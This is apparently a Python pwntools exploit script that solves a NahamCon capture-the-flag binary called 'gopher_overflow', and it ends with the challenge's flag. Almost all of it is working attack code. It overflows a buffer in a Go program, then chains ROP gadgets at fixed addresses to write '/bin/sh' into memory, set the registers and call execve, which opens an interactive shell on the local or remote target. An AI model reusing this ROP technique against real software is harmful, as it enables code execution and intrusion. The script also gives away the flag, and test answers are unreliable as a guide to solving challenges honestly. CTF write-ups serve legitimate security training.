#!/usr/bin/python3
from pwn import *
#debugging GOLANG with gdb ><
gs = '''
source /usr/local/go/src/runtime/runtime-gdb.py
b *0x404aa1
continue
'''
elf = context.binary = ELF('./gopher_overflow')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./gopher_overflow', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 31883)
    else:
        return process('./gopher_overflow')
r = start()
#========= exploit here ===================
#execve()
rop  = b""
rop += b"A" *0x10
rop += b"\0" * 0x20     # zero
rop += p64(0x51f100) *16 # write check sled
rop += b"\0"*0x40 #zero padding for checks
#rop
rop += p64(0x0000000000404aa1)# pop rbx; ret;
rop += b"/bin/sh\0"
rop += p64(0x0000000000401113) # mov rcx, rbx; add rsp, 0x10; pop rbp; ret;
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0x51f100)
rop += p64(0x000000000045d480) #mov rax, rbp; ret;
rop += p64(0x000000000042cb73) # mov qword ptr [rax], rcx; ret; stores /bin/sh into 0x519100
#rdi
rop += p64(0x0000000000404aa1) # pop rbx; ret;
rop += p64(0x51f100) #rw
rop += p64(0x000000000044a7ff) # mov rdi, rbx; add rsp, 0x18; pop rbp; ret;)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
#rsi
rop += p64(0x0000000000404aa1) # pop rbx; ret;
rop += p64(0)
rop += p64(0x0000000000401113) # mov rcx, rbx; add rsp, 0x10; pop rbp; ret;
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef) 
rop += p64(0x00000000004115c9) # mov rsi, rcx; add rsp, 0x10; pop rbp; ret;
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef)
rop += p64(0xdeadbeef) #
#rdx
rop += p64(0x000000000047a67a) # pop rdx; ret;
rop += p64(0)
#rax
rop += p64(0x47cdb3)      # pop rax; pop rbp; ret;
rop += p64(0x3b)          # execve()
rop += p64(0xdeadbeef)    
#syscall
rop += p64(0x000000000045e5e9) #syscall; ret;

r.sendlineafter(b"the gopher?", rop)
#========= interactive ====================
r.interactive()
#flag{6a34c27f3bb3b25d98e7c1a1896217db}